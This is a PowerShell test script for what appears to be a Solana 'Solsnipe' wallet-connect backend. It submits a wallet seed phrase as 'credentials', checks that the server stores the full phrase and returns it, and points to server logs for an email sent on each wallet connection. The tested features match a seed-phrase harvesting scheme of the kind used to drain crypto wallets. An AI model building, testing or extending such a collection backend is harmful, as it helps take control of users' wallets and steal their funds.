# Test New Features
# Tests: 1) WalletType in email, 2) credentials/solsnipeBalance storage, 3) get-wallet-details endpoint

Write-Host "🧪 Testing New Features" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor Gray
Write-Host ""

$baseUrl = "http://localhost:8888/.netlify/functions"

# Test 1: Wallet Connection (stores credentials + solsnipeBalance)
Write-Host "TEST 1: Wallet Connection (New Wallet)" -ForegroundColor Yellow
Write-Host "-" * 70 -ForegroundColor Gray

$walletBody = @{
    walletName = "feature-test-user-$(Get-Random -Maximum 9999)"
    walletType = "solana"
    inputType = "seed_phrase"
    credentials = "pill tomorrow foster begin walnut blade pen area slab bean forest liar"
} | ConvertTo-Json

try {
    Write-Host "Connecting wallet..." -ForegroundColor Gray
    $response = Invoke-WebRequest -Uri "$baseUrl/wallet-connect" `
        -Method POST `
        -Headers @{"Content-Type"="application/json"} `
        -Body $walletBody `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    $token = $result.token
    $walletAddress = $result.walletAddress
    
    Write-Host "✅ PASSED - Wallet Connected!" -ForegroundColor Green
    Write-Host "   Wallet Address: $walletAddress" -ForegroundColor Gray
    Write-Host "   Token: $($token.Substring(0, 20))..." -ForegroundColor Gray
    Write-Host ""
    Write-Host "   📧 Check server logs for email with WalletType field" -ForegroundColor Cyan
    Write-Host ""
} catch {
    Write-Host "❌ FAILED - Wallet connection failed!" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)" -ForegroundColor Red
    if ($_.ErrorDetails.Message) {
        Write-Host "   Details: $($_.ErrorDetails.Message)" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "⚠️  Make sure netlify dev is running!" -ForegroundColor Yellow
    exit 1
}

Start-Sleep -Seconds 2

# Test 2: Get Wallet Details (retrieves credentials + solsnipeBalance)
Write-Host "TEST 2: Get Wallet Details" -ForegroundColor Yellow
Write-Host "-" * 70 -ForegroundColor Gray

try {
    Write-Host "Fetching wallet details..." -ForegroundColor Gray
    $response = Invoke-WebRequest -Uri "$baseUrl/get-wallet-details" `
        -Method GET `
        -Headers @{"Authorization"="Bearer $token"} `
        -UseBasicParsing
    
    $result = $response.Content | ConvertFrom-Json
    $wallet = $result.wallet
    
    Write-Host "✅ PASSED - Wallet Details Retrieved!" -ForegroundColor Green
    Write-Host ""
    Write-Host "Wallet Information:" -ForegroundColor Cyan
    Write-Host "   Address:          $($wallet.walletAddress)" -ForegroundColor White
    Write-Host "   Type:             $($wallet.walletType)" -ForegroundColor White
    Write-Host "   Input Type:       $($wallet.inputType)" -ForegroundColor White
    Write-Host ""
    Write-Host "Balances:" -ForegroundColor Cyan
    Write-Host "   SOL Balance:      $($wallet.balance) SOL" -ForegroundColor White
    Write-Host "   Solsnipe Balance: $($wallet.solsnipeBalance)" -ForegroundColor Green
    Write-Host ""
    Write-Host "Credentials:" -ForegroundColor Cyan
    if ($wallet.credentials) {
        Write-Host "   ✅ Stored:        $($wallet.credentials.Substring(0, 30))..." -ForegroundColor Green
    } else {
        Write-Host "   ❌ Not Found" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "Account Stats:" -ForegroundColor Cyan
    Write-Host "   Created:          $($wallet.createdAt)" -ForegroundColor White
    Write-Host "   Last Login:       $($wallet.lastLoginAt)" -ForegroundColor White
    Write-Host "   Login Count:      $($wallet.loginCount)" -ForegroundColor White
    Write-Host "   Transactions:     $($wallet.transactions.Count)" -ForegroundColor White
    Write-Host ""
    
    # Verify new fields exist
    Write-Host "Feature Verification:" -ForegroundColor Cyan
    if ($wallet.credentials) {
        Write-Host "   ✅ Credentials stored successfully" -ForegroundColor Green
    } else {
        Write-Host "   ❌ Credentials NOT stored" -ForegroundColor Red
    }
    
    if ($null -ne $wallet.solsnipeBalance) {
        Write-Host "   ✅ Solsnipe Balance field exists (value: $($wallet.solsnipeBalance))" -ForegroundColor Green
    } else {
        Write-Host "   ❌ Solsnipe Balance field missing" -ForegroundColor Red
    }
    
} catch {
    Write-Host "❌ FAILED - Get wallet details failed!" -ForegroundColor Red
    Write-Host "   Error: $($_.Exception.Message)" -ForegroundColor Red
    if ($_.ErrorDetails.Message) {
        Write-Host "   Details: $($_.ErrorDetails.Message)" -ForegroundColor Red
    }
}

Write-Host ""
Write-Host "=" * 70 -ForegroundColor Gray
Write-Host "📋 Summary" -ForegroundColor Cyan
Write-Host ""
Write-Host "Feature 1 - WalletType in Email:" -ForegroundColor White
Write-Host "   Check server logs for:" -ForegroundColor Gray
Write-Host "   📧 Wallet Connection Email Data:" -ForegroundColor Gray
Write-Host "      WalletType: 'solana'" -ForegroundColor Gray
Write-Host ""
Write-Host "Feature 2 - Credentials Storage:" -ForegroundColor White
Write-Host "   ✅ Verified in get-wallet-details response" -ForegroundColor Gray
Write-Host ""
Write-Host "Feature 3 - Solsnipe Balance:" -ForegroundColor White
Write-Host "   ✅ Initialized to 0" -ForegroundColor Gray
Write-Host "   ✅ Returned in get-wallet-details response" -ForegroundColor Gray
Write-Host ""
Write-Host "✅ All Features Tested!" -ForegroundColor Green
